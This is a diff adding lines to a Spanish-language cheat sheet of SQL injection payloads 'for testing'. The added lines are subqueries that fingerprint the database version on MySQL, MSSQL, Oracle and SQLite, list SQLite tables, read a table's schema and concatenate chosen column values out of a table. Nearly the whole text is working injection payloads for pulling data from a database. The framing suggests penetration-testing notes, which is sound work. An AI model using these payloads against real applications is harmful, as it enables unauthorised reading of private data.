@@ -50,7 +50,24 @@ Sql payloads para testing:
 ; 	%3B
 ) 	%29
 
+############## Version de la base de datos:
 
+# MySQL and MSSQL
+@@version
+# For Oracle
+(SELECT banner FROM v$version)
+# For SQLite
+sqlite_version()
+
+
+############## ver tablas dentro de una db SQLITE
+(SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%')
+
+ver columnas dentro de una tabla SQLITE:
+(SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='<tabla>')
+
+extraer campos de una tabla SQLITE:
+(SELECT group_concat(<campo1> || "," || <camp2> || "," || <campo3> || ":") from <tabla>)
 
 
 
